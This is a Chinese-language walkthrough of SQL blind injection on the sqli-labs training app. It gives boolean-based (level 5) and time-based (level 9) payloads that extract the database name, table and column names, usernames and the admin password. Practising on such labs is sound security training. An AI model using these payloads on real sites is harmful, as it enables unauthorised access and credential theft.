> SQL盲注根据反馈结果分类分为 **布尔盲注**和**时间盲注**
## 以sqli-labs第五关为例（布尔盲注）
```sql
?id=1'  
#观察页面是否异常，并判定闭合方式

?id=1' --+
#若页面恢复正常，说明注入点为单引号闭合。

?id=1' and 1=1 --+
#构造真假条件，观察页面反应。真条件（返回“You are in...”）

?id=1' and 1=2 --+
#构造假条件，观察页面反应。假条件（无内容）。以上步骤页面行为存在差异，确认了布尔盲注的可行性。

?id=1' and length(database())=8 --+
#猜解数据库名长度。若页面返回正常，说明数据库名长度为8

?id=1' and ascii(substr(database(),1,1))>100 --+
#通过二分法逐步缩小ASCII码范围，确定每个字符（如第一个字符为's'，ASCII码115）获取数据库名为security

?id=1' and (select count(table_name) from information_schema.tables where table_schema='security')=4 --+
#猜解表数量,确认当前数据库有4个表。

?id=1' and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))=5 --+
#猜解表名的长度

?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))>100 --+
#逐个字符猜解，得到表名

?id=1' and (select count(column_name) from information_schema.columns where table_name='users')=3 --+
#猜解users表中有3列

?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 0,1))=2 --+
#猜解列的长度

?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>100 --+
#猜解列名，如id，username，password

?id=1' and length((select username from users limit 0,1))=4 --+
#猜解username长度

?id=1' and ascii(substr((select username from users limit 0,1),1,1))>68 --+
#逐个字符猜解username的值

?id=1' and ascii(substr((select password from users where username='admin' limit 0,1),1,1))>50 --+
#猜解密码

```

## 以sqli-labs第九关为例（时间盲注）
> 输入测试‌：尝试 ?id=1'、?id=1"、?id=1') 等闭合符号，发现无论输入正确或错误，页面均显示相同内容（如“You are in...”），无显性错误回显，说明需使用‌时间盲注。通过 sleep() 函数触发延迟，确认闭合符号为‌单引号‌
```sql
?id=1' and sleep(5) --+
#利用sleep()函数触发延时，后续步骤根据是否触发延时来判定正确与否

?id=1' and if(length(database())=8, sleep(5), 1) --+
#结合 if() 和 length() 函数，判断数据库名长度是否为8

?id=1' and if(ascii(substr(database(),1,1))>100, sleep(5), 1) --+
#逐个猜解数据库名 security

?id=1' and if((select count(table_name) from information_schema.tables where table_schema='security')=4,sleep(5),1) --+
#判断security数据库是否是4张表

?id=1' and if(length((select table_name from information_schema.tables where table_schema='security' limit 0,1))=6,sleep(5),1) --+
#分別判断数据表的长度（emails、referers‌、uagents‌、users‌）

?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))>100,sleep(5),1) --+
#逐个字符猜解，得到表名 

?id=1' and if((select count(column_name) from information_schema.columns where table_name='users')=3,sleep(5),1) --+
#猜解users表是否有3列

?id=1' and if(length((select column_name from information_schema.columns where table_name='users' limit 0,1))=2,sleep(5),1) --+
#猜解列的长度

?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>100,sleep(5),1) --+
#猜解列名，如id，username，password

?id=1' and if(length((select username from users limit 0,1))=4,sleep(5),1) --+
#猜解username第一个记录的长度

?id=1' and if(ascii(substr((select username from users limit 0,1),1,1))>68,sleep(5),1) --+
#逐个字符猜解username的值

?id=1' and if(ascii(substr((select password from users where username='admin' limit 0,1),1,1))>50,sleep(5),1) --+
#猜解密码


```